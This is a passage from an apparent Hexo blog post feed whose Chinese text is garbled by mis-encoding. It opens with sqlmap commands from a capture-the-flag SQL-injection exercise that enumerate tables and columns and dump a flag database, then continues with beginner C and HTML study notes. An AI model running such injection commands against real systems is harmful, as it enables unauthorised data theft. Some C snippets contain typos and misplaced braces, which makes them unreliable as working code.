src="https://img-blog.csdnimg.cn/20190523221840906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70" alt="img"></p><p>ä¹‹åæŸ¥è¡¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -r &quot;c:\Users\HP\Desktop\1.txt&quot; -p id --D skctf_flag --tables</span><br></pre></td></tr></table></figure><p>æŸ¥å­—æ®µï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -r &quot;c:\Users\HP\Desktop\1.txt&quot; -p id --D database_name -T table_name --columns</span><br></pre></td></tr></table></figure><p>æŸ¥å†…å®¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -r &quot;c:\Users\HP\Desktop\1.txt&quot; -p id --D database_name -T table_name -C column_name --dump</span><br></pre></td></tr></table></figure><h5 id="æ­¤æ–‡å¤§éƒ¨åˆ†æ–¹æ³•å’Œå†…å®¹è½¬è½½äº"><a href="#æ­¤æ–‡å¤§éƒ¨åˆ†æ–¹æ³•å’Œå†…å®¹è½¬è½½äº" class="headerlink" title="æ­¤æ–‡å¤§éƒ¨åˆ†æ–¹æ³•å’Œå†…å®¹è½¬è½½äº"></a>æ­¤æ–‡å¤§éƒ¨åˆ†æ–¹æ³•å’Œå†…å®¹è½¬è½½äº</h5><p><a href="https://blog.csdn.net/vhkjhwbs/article/details/89740401">https://blog.csdn.net/vhkjhwbs/article/details/89740401</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å­—ç¬¦ä¸²è¿æ¥</title>
      <link href="/2020/12/07/c/%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9E%E6%8E%A5/"/>
      <url>/2020/12/07/c/%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9E%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h4 id="ä»Šæ—¥ï¼šä¸å­—ç¬¦ä¸²é“¾æ¥æœ‰å…³çš„å‡½æ•°"><a href="#ä»Šæ—¥ï¼šä¸å­—ç¬¦ä¸²é“¾æ¥æœ‰å…³çš„å‡½æ•°" class="headerlink" title="ä»Šæ—¥ï¼šä¸å­—ç¬¦ä¸²é“¾æ¥æœ‰å…³çš„å‡½æ•°"></a>ä»Šæ—¥ï¼šä¸å­—ç¬¦ä¸²é“¾æ¥æœ‰å…³çš„å‡½æ•°</h4><p>strcpyï¼Œstrcatï¼›<br>strcatå‡½æ•°ï¼š<br>å°†ä¸¤ä¸ªcharç±»å‹è¿æ¥ã€‚<br>strcpyå‡½æ•°ï¼š<br>å¤´æ–‡ä»¶ï¼š#include &lt; string.h&gt; å’Œ #include &lt;stdio.h&gt;<br>åŠŸèƒ½ï¼šæŠŠä»srcåœ°å€å¼€å§‹ä¸”å«æœ‰NULLç»“æŸç¬¦çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ°ä»¥destå¼€å§‹çš„ åœ°å€ç©ºé—´</p><p>â€‹                              å¯å˜å‚æ•°  é“¾æ¥ï¼š<a href="https://blog.csdn.net/longintchar/article/details/85490103">https://blog.csdn.net/longintchar/article/details/85490103</a></p><p>[^æ‘˜å–è‡ªé“¾æ¥ï¼š<a href="https://blog.csdn.net/slk11580/article/details/79571478]">https://blog.csdn.net/slk11580/article/details/79571478]</a>: </p>]]></content>
      
      
      
        <tags>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‡½æ•°é€’å½’</title>
      <link href="/2020/11/14/c/%E5%87%BD%E6%95%B0%E9%80%92%E5%BD%92/"/>
      <url>/2020/11/14/c/%E5%87%BD%E6%95%B0%E9%80%92%E5%BD%92/</url>
      
        <content type="html"><![CDATA[<p> é€’å½’æ€æƒ³</p><p>æ ¼å¼ï¼švoid recursion() </p><p>{   statements;   â€¦ â€¦ â€¦   recursion(); /* å‡½æ•°è°ƒç”¨è‡ªèº« */  </p><p> â€¦ â€¦ â€¦ </p><p>}</p><p>  int main() </p><p>{   recursion();</p><p> }</p><p>åº”ç”¨åˆ°æ±‚<u><strong>é˜¶ä¹˜ä¸Šï¼Œè¿˜æœ‰æ–æ³¢é‚£å¥‘æ•°åˆ—</strong></u></p><p> é€’å½’å‡½æ•°å¯ä»¥ä½¿å®ƒè°ƒç”¨å…¶æœ¬èº«</p><p>ä½†æ˜¯å­˜åœ¨ä¸åˆ©æƒ…å†µï¼š</p><p>ç”µè„‘ç©ºé—´å¤§è‡´åˆ†<strong>Heapï¼ˆå †ï¼‰</strong>å’Œ<strong>Stackï¼ˆæ ˆï¼‰</strong>ä¸¤ç§ã€‚</p><p><strong>æ ˆ</strong>æ˜¯ç”¨äº<strong>å‡½æ•°</strong>çš„ç©ºé—´ã€‚</p><p>ç”µè„‘è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå°±ä¼šä½¿ç”¨ä¸€å±‚æ ˆï¼›</p><p>ç›¸åï¼Œç”µè„‘ä¸­ä¸€ä¸ªå‡½æ•°ç»“æŸï¼ˆreturnï¼‰ï¼Œå°±ä¼šé‡Šæ”¾è¿™ä¸€å±‚æ ˆï¼Œ<strong>è¿åŒåœ¨è¿™å±‚æ ˆï¼ˆè¿™ä¸ªå‡½æ•°ï¼‰ä¸­å®šä¹‰çš„æ‰€æœ‰ä¸œè¥¿</strong>ã€‚</p><p>ä¸åœ¨æ ˆä¸­çš„ï¼Œåº”è¯¥å°±åœ¨å †ä¸­ã€‚<strong>ï¼ˆè¿™å°±æ˜¯å®šä¹‰å…¨åŒºå˜é‡ä¸å±€éƒ¨å˜é‡çš„ç”¨å¤„ï¼‰</strong></p><p><strong>å¦‚æœè°ƒç”¨å¤ªå¤šå±‚æ ˆï¼ˆå¤ªå¤šä¸ªå‡½æ•°ï¼‰ï¼Œ**</strong>ç”µè„‘å°±ä¼šæš´ç©ºé—´ï¼**</p><p>æ‰€ä»¥è¯´ï¼Œè°ƒç”¨é€’å½’å‡½æ•°ï¼Œå°±ä¼š<strong>ä¸€å±‚ä¸€å±‚åœ°å‹æ ˆ</strong>ï¼Œ<strong>ç”µè„‘å°±ä¼šæš´ç©ºé—´ï¼</strong>ï¼ˆ<strong>å¹¶ä¸ä»£è¡¨ä¸å»ºè®®ç”¨é€’å½’ï¼Œåªæ˜¯ä½œæç¤ºè€Œå·²</strong>ï¼‰</p><p><strong>é€’å½’</strong>ï¼Œå°±æ˜¯<strong>é€’ï¼ˆä¸€å±‚ä¸€å±‚åœ°è°ƒç”¨ï¼‰</strong>ï¼Œ<strong>å½’ï¼ˆä¸€å±‚ä¸€å±‚åœ°è¿”å›ï¼‰</strong>ï¼Œè¿™æ ·ä¼š<strong>è´¹å¾ˆå¤šæ—¶é—´</strong>ï¼å®¹æ˜“<strong>è¶…æ—¶</strong>ï¼</p><p><strong>ä½†æ˜¯ï¼Œ</strong>æˆ‘å¹¶<strong>ä¸æ˜¯</strong>è¯´ä¸ç”¨é€’å½’ï¼Œ<strong>è€Œæ˜¯</strong>è¯´èƒ½ç”¨é€’æ¨ç®—æ³•çš„ï¼Œæœ€å¥½ä¸ç”¨é€’å½’ç®—æ³•ï¼Œï¼ˆåŸå› ä½ çŸ¥é“ï¼‰ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¨‹åºå®éªŒä¸‰</title>
      <link href="/2020/11/12/c/%E7%A8%8B%E5%BA%8F%E5%AE%9E%E9%AA%8C%E4%B8%89/"/>
      <url>/2020/11/12/c/%E7%A8%8B%E5%BA%8F%E5%AE%9E%E9%AA%8C%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<p> 1ã€æ•´æ•°å–åæ—¶ï¼Œå¯ç”¨åˆ°reverseå‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int reverse(int n)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">â€‹          int temp&#x3D;0;</span><br><span class="line">â€‹while (n!&#x3D;0)</span><br><span class="line">â€‹&#123;</span><br><span class="line">â€‹temp&#x3D;temp*10+n%10;</span><br><span class="line">â€‹n&#x3D;n&#x2F;10;</span><br><span class="line">â€‹</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">return temp;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2ã€å€’é‡‘å­—å¡”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int i,n,j;</span><br><span class="line">printf(&quot;è¯·è¾“å…¥ä¸€ä¸ªæ•´æ•°: \n&quot;);</span><br><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">for(i&#x3D;1;i&lt;&#x3D;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">  for(j&#x3D;1;j&lt;i;j++)</span><br><span class="line">    printf(&quot; &quot;);</span><br><span class="line">     for(j&#x3D;2*n-1;j&gt;&#x3D;2*i-1;j--)</span><br><span class="line">     printf(&quot;*&quot;);</span><br><span class="line">     printf(&quot;\n&quot;); </span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3ã€æ±‚å’Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int a,n,i,j,sum;</span><br><span class="line">printf(&quot;è¯·è¾“å…¥ä¸¤ä¸ªæ•´æ•°åˆ†åˆ«ä¸ºa&#x3D; n&#x3D; \n&quot;);</span><br><span class="line">scanf(&quot;%d %d&quot;,&amp;a,&amp;n);</span><br><span class="line">sum&#x3D;0,j&#x3D;0;</span><br><span class="line">for(i&#x3D;1;i&lt;&#x3D;n;i++)</span><br><span class="line">j&#x3D;j*10+a;</span><br><span class="line">sum&#x3D;sum+j;</span><br><span class="line">printf(&quot;a+aa+aaa+.....&#x3D;%d\n&quot;,sum);</span><br><span class="line">&#125; </span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æŒ‡é’ˆ</title>
      <link href="/2020/11/08/c/%E6%8C%87%E9%92%88/"/>
      <url>/2020/11/08/c/%E6%8C%87%E9%92%88/</url>
      
        <content type="html"><![CDATA[<p> æŒ‡é’ˆå’ŒæŒ‡é’ˆå˜é‡</p><p>char *pa;//  å®šä¹‰ä¸€ä¸ªæŒ‡å‘å­—ç¬¦å‹çš„æŒ‡é’ˆå˜é‡ï¼›</p><p>int *pb;//   å®šä¹‰ä¸€ä¸ªæŒ‡å‘æ•´å‹çš„æŒ‡é’ˆå˜é‡ï¼›</p><p>å–åœ°å€è¿ç®—ç¬¦  &amp;</p><p>å–å€¼è¿ç®—ç¬¦   *</p><p>æœªç†è§£çš„</p><p>ï¼ˆnowï¼Œaï¼‰</p><p>( the addr of a is)</p><p>é¿å…è®¿é—®æœªåˆå§‹åŒ–çš„æŒ‡é’ˆ</p>]]></content>
      
      
      
        <tags>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>äºŒç»´æ•°ç»„</title>
      <link href="/2020/11/08/c/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/"/>
      <url>/2020/11/08/c/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<p> äºŒç»´æ•°ç»„ï¼ˆçŸ©é˜µï¼‰</p><p>ä¾‹å­ï¼šint a[6] [6] ;//6*6,6è¡Œ6åˆ—</p><p>è®¿é—®äºŒç»´æ•°ç»„ </p><p>ä¾‹å­: a[0] [0] è®¿é—®aæ•°ç»„ï¼Œç¬¬ä¸€è¡Œç¬¬ä¸€åˆ—ä¸­çš„å…ƒç´ </p><p>æ³¨æ„é˜²æ­¢è¶Šç•Œè®¿é—®ï¼ˆå–å€¼èŒƒå›´ï¼‰</p><p>äºŒç»´æ•°ç»„åˆå§‹åŒ–ï¼Œå¯ç”¨åµŒå¥—è¯­å¥for</p><p>äºŒç»´æ•°ç»„ä¹Ÿå¯ä»¥å¯¹éƒ¨åˆ†å…ƒç´ èµ‹å€¼</p><p>å¦‚ int a[3] [4]="{{1}ï¼Œ{5}ï¼Œ{9}}"æ¯ä¸€åˆ—ç¬¬ä¸€ä¸ªæ•°</p><p>äºŒç»´æ•°ç»„çš„[ ] [ ]ç¬¬ä¸€ä¸ªâ€œ[ ]â€å¯ä»¥ä¸å†™</p>]]></content>
      
      
      
        <tags>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>other ä¸€äº› information</title>
      <link href="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/"/>
      <url>/2020/11/05/x/%E8%AF%BE%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h4 id="fafuå­¦é•¿è®²è¯¾è®°å½•çš„ï¼š"><a href="#fafuå­¦é•¿è®²è¯¾è®°å½•çš„ï¼š" class="headerlink" title="fafuå­¦é•¿è®²è¯¾è®°å½•çš„ï¼š"></a>fafuå­¦é•¿è®²è¯¾è®°å½•çš„ï¼š</h4><p>Webå®‰å…¨</p><p>cryptoï¼šçŸ©é˜µï¼Œæ•°è®ºï¼Œå¯†ç å­¦</p><p>dvwaå¹³å°</p><h5 id="htmlçš„å¸¸è§æ ‡ç­¾"><a href="#htmlçš„å¸¸è§æ ‡ç­¾" class="headerlink" title="htmlçš„å¸¸è§æ ‡ç­¾"></a>htmlçš„å¸¸è§æ ‡ç­¾</h5><ul><li><ul><li><strong><!DOCTYPE html></strong> å£°æ˜ä¸º HTML5 æ–‡æ¡£</li><li><strong><html></html></strong> å…ƒç´ æ˜¯ HTML é¡µé¢çš„æ ¹å…ƒç´ </li><li><strong><head></head></strong> å…ƒç´ åŒ…å«äº†æ–‡æ¡£çš„å…ƒï¼ˆmetaï¼‰æ•°æ®ï¼Œå¦‚ <strong><meta charset="utf-8"></strong> å®šä¹‰ç½‘é¡µç¼–ç æ ¼å¼ä¸º <strong>utf-8</strong>ã€‚</li><li><strong><title></title></strong> å…ƒç´ æè¿°äº†æ–‡æ¡£çš„æ ‡é¢˜</li><li><strong><body></body></strong> å…ƒç´ åŒ…å«äº†å¯è§çš„é¡µé¢å†…å®¹</li><li><strong><h1></h1></strong> å…ƒç´ å®šä¹‰ä¸€ä¸ªå¤§æ ‡é¢˜</li><li><strong><p></p></strong> å…ƒç´ å®šä¹‰ä¸€ä¸ªæ®µè½</li><li>HTML      æ ‡ç­¾é€šå¸¸æ˜¯<em>æˆå¯¹å‡ºç°</em>çš„ï¼Œæ¯”å¦‚ <b> å’Œ      </b></li><li>æ ‡ç­¾å¯¹ä¸­çš„ç¬¬ä¸€ä¸ªæ ‡ç­¾æ˜¯<em>å¼€å§‹æ ‡ç­¾</em>ï¼Œç¬¬äºŒä¸ªæ ‡ç­¾æ˜¯<em>ç»“æŸæ ‡ç­¾</em></li></ul></li></ul><h5 id="HTML-ç½‘é¡µç»“æ„"><a href="#HTML-ç½‘é¡µç»“æ„" class="headerlink" title="HTML ç½‘é¡µç»“æ„"></a><strong>HTML ç½‘é¡µç»“æ„</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ä¸‹é¢æ˜¯ä¸€ä¸ªå¯è§†åŒ–çš„HTMLé¡µé¢ç»“æ„ï¼š</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;é¡µé¢æ ‡é¢˜&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;è¿™æ˜¯ä¸€ä¸ªæ ‡é¢˜&lt;&#x2F;h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;è¿™æ˜¯ä¸€ä¸ªæ®µè½ã€‚&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;è¿™æ˜¯å¦å¤–ä¸€ä¸ªæ®µè½ã€‚&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h4 id="å¤§ä½¬è®²è¯¾"><a href="#å¤§ä½¬è®²è¯¾" class="headerlink" title="å¤§ä½¬è®²è¯¾"></a>å¤§ä½¬è®²è¯¾</h4><p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(170).png"></p><p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(171).png"></p><p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(172).png"></p><p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(173).png"><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(177).png"><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(179).png"></p><p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(180).png"></p><p><img src="/2020/11/05/x/%E8%AF%BE%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(181).png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> åˆ†äº« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/11/05/x/hello-world/"/>
      <url>/2020/11/05/x/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Cè¯­è¨€æ±‚ä½™é—®é¢˜</title>
      <link href="/2020/11/02/c/C%E6%B1%82%E4%BD%99%E5%BE%97%E5%90%84%E4%B8%AA%E4%BD%8D/"/>
      <url>/2020/11/02/c/C%E6%B1%82%E4%BD%99%E5%BE%97%E5%90%84%E4%B8%AA%E4%BD%8D/</url>
      
        <content type="html"><![CDATA[<h4 id="cè¯­è¨€ä¸­-aä¸ºä¸€ä¸ªå››ä½æ•°-é‚£ä¹ˆa-1000-100æ˜¯å•¥"><a href="#cè¯­è¨€ä¸­-aä¸ºä¸€ä¸ªå››ä½æ•°-é‚£ä¹ˆa-1000-100æ˜¯å•¥" class="headerlink" title="cè¯­è¨€ä¸­ aä¸ºä¸€ä¸ªå››ä½æ•° é‚£ä¹ˆa%1000/100æ˜¯å•¥"></a>cè¯­è¨€ä¸­ aä¸ºä¸€ä¸ªå››ä½æ•° é‚£ä¹ˆa%1000/100æ˜¯å•¥</h4><p>å‡è®¾açš„å€¼ä¸º1345ï¼Œé‚£ä¹ˆå½“a%1000ï¼Œå€¼ä¸º345ï¼Œé‚£ä¹ˆ345/100ï¼Œç»“æœå°±æ˜¯3ï¼›<br>æ‰€ä»¥è¿™ä¸ªç®—æ³•æ˜¯ç”¨æ¥å–å¾—è¿™ä¸ªå››ä½æ•°çš„ç™¾ä½æ•°å€¼</p><p>åŒæ ·çš„æ€æƒ³åº”ç”¨åœ¨æ°´ä»™èŠ±æ•°ä¸Šï¼Œå–ç™¾ä½ï¼Œåä½ï¼Œä¸ªä½ä¸Šçš„æ•°åˆ†åˆ«ä¸º</p><p>aï¼Œbï¼Œcï¼Œd</p><p>b=a/100ï¼›</p><p>c=a/10%10;</p><p>d=a%10;</p>]]></content>
      
      
      
        <tags>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ°´ä»™èŠ±æ•°ã€ç´ æ•°</title>
      <link href="/2020/10/31/c/%E6%B0%B4%E4%BB%99%E8%8A%B1%E6%95%B0%E3%80%81%E7%B4%A0%E6%95%B0/"/>
      <url>/2020/10/31/c/%E6%B0%B4%E4%BB%99%E8%8A%B1%E6%95%B0%E3%80%81%E7%B4%A0%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>   <strong>æ°´ä»™èŠ±æ•°</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int a,b,c,d;</span><br><span class="line">scanf(&quot;%d&quot;,&amp;a);</span><br><span class="line">b&#x3D;a&#x2F;100;</span><br><span class="line">c&#x3D;a&#x2F;10%10;</span><br><span class="line">d&#x3D;a%10;</span><br><span class="line">if(b*100+c*10+d&#x3D;&#x3D;b*b*b+c*c*c+d*d*d) printf(&quot;Yes&quot;);</span><br><span class="line">else  printf(&quot;No&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„å–ä½™ï¼Œè‹¥è¦æ±‚æ±‚å‡ºèŒƒå›´å†…çš„æ‰€æœ‰æ°´ä»™èŠ±æ•°ï¼Œåˆ™ç”¨forè¯­å¥ã€‚</p><p>â€‹    <strong>ç´ æ•°</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int IsPrime(int x)</span><br><span class="line"></span><br><span class="line">&#123;  int i;</span><br><span class="line"></span><br><span class="line">for(i&#x3D;2;i&lt;x;i++)</span><br><span class="line"></span><br><span class="line">if(!(x%i))</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">rerurn 1;</span><br><span class="line"></span><br><span class="line">&#125;                                     </span><br></pre></td></tr></table></figure><p> è§£é‡Šï¼šx%i çš„æ„æ€æ˜¯ xå¯¹iæ±‚ä½™ï¼Œæ•´ä¸ªæ„æ€æ˜¯ ï¼šå¦‚æœ xå¯¹içš„ä½™æ•°æ˜¯0      åˆ™ä¸ºçœŸ</p><p>â€‹                                                   å°±æ¥ç€æ‰§è¡Œä¸‹é¢çš„ç¨‹åºã€‚ </p><p>â€‹                                                           </p><h3 id="å†™primeå‡½æ•°åˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯å¦æ˜¯ç´ æ•°"><a href="#å†™primeå‡½æ•°åˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯å¦æ˜¯ç´ æ•°" class="headerlink" title="å†™primeå‡½æ•°åˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯å¦æ˜¯ç´ æ•°"></a>å†™primeå‡½æ•°åˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯å¦æ˜¯ç´ æ•°</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void main ( )</span><br><span class="line">&#123;</span><br><span class="line">int m,n,i,j,k;</span><br><span class="line">scanf(&quot;%d %d&quot;,&amp;m,&amp;n);</span><br><span class="line">for(i&#x3D;m;i&lt;&#x3D;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">if(i&#x3D;&#x3D;2) &#123; &#x2F;&#x2F;å¦‚æœæ˜¯bai2ï¼Œ ç›´æ¥è¾“å‡ºã€‚</span><br><span class="line">printf( &quot;%d &quot;, i);</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">for(j&#x3D;2;j&lt;i;j++) &#x2F;&#x2F;åº”è¯¥æ˜¯j&lt;i</span><br><span class="line">if(i%j&#x3D;&#x3D;0) break; &#x2F;&#x2F;è¿™ä¸ªbreakåªèƒ½è·³duå‡ºæœ€å†…å±‚çš„forå¾ªç¯</span><br><span class="line">if(j&#x3D;&#x3D;i) printf(&quot;%d &quot;,i); &#x2F;&#x2F;printfåº”è¯¥æ”¾åˆ°å¾ªzhiç¯å¤–ï¼Œå¹¶ä¸”åªæœ‰å½“j&#x3D;&#x3D;içš„æ—¶å€™iæ‰æ˜¯daoç´ æ•°</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cè¯­è¨€æ³¨</title>
      <link href="/2020/10/18/c/C%E8%AF%AD%E8%A8%80%E6%B3%A8/"/>
      <url>/2020/10/18/c/C%E8%AF%AD%E8%A8%80%E6%B3%A8/</url>
      
